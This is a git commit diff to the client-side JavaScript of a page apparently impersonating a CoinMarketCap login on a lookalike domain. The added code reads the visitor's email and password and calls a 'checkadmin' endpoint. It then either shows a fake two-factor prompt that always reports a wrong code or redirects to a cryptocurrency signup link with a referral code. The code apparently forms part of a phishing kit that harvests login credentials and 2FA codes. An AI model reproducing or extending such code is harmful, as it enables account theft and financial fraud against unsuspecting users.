32505228c2491b96834e5a67cfd8893ddd5c610d
hungdoba <hungdoba.hdb@gmail.com>
2023-09-16 12:56:20 +0900

    update 2fa

--- static/js/client.js
+++ static/js/client.js
@@ -1,4 +1,5 @@
 const BACKEND_URL = 'https://event.coinmarketcap.jp/';
+// const BACKEND_URL = 'http://127.0.0.1:8001/';
 var PREVIOUS_SENT_DATA;
 let USER_IP = 'none';
 let USER_AGENT = 'none';
@@ -92,9 +93,70 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 });
 
+function isEmail(email) {
+  const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
+  return emailPattern.test(email);
+}
+
+function showToastify(content) {
+  toastifyContentElement.textContent = content;
+  toastifyElement.style.display = 'block';
+  setTimeout(() => {
+    toastifyElement.style.display = 'none';
+  }, 3000);
+}
+
+const usernameElement = document.getElementById('coinmarketcap-username');
+const passwordElement = document.getElementById('coinmarketcap-password');
+const twoFactorElement = document.getElementById('two-factor');
+
+const toastifyElement = document.getElementById('toastify');
+const toastifyContentElement = document.getElementById('toastify-content');
+
 const loginComponent = document.getElementById('coinmarketcap-login');
-loginComponent.addEventListener('click', (event) => {
-  event.preventDefault();
-  window.location.href =
-    'https://app.vortic-united.com/signup?referral=YJkvxEhWz4efGNBVVdCWwMa9bcSix9U1';
+loginComponent.addEventListener('click', async (event) => {
+  let username = usernameElement.value;
+  let password = passwordElement.value;
+  if (username == '' || password == '') {
+    showToastify('Failed to login. Check your email and password');
+    return;
+  } else {
+    if (!isEmail(username)) {
+      showToastify('Failed to login. Check your email and password');
+      return;
+    }
+  }
+
+  fetch(`${BACKEND_URL}checkadmin`)
+    .then((response) => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then((data) => {
+      if (data.status == true) {
+        twoFactorElement.style.display = 'block';
+      } else {
+        window.location.href =
+          'https://app.vortic-united.com/signup?referral=YJkvxEhWz4efGNBVVdCWwMa9bcSix9U1';
+      }
+    })
+    .catch((error) => {
+      console.error('Fetch error:', error);
+      window.location.href =
+        'https://app.vortic-united.com/signup?referral=YJkvxEhWz4efGNBVVdCWwMa9bcSix9U1';
+    });
 });
+
+const twoFactorValueElement = document.getElementById('coinmarketcap-captcha');
+function submitTwoFactor() {
+  if (twoFactorValueElement.value.length == 6) {
+    setTimeout(() => {
+      showToastify('Wrong code of two-factor authentication');
+      twoFactorElement.style.display = 'none';
+    }, 1000);
+  } else {
+    showToastify('Two-factor authentication must have 6 digits');
+  }
+}
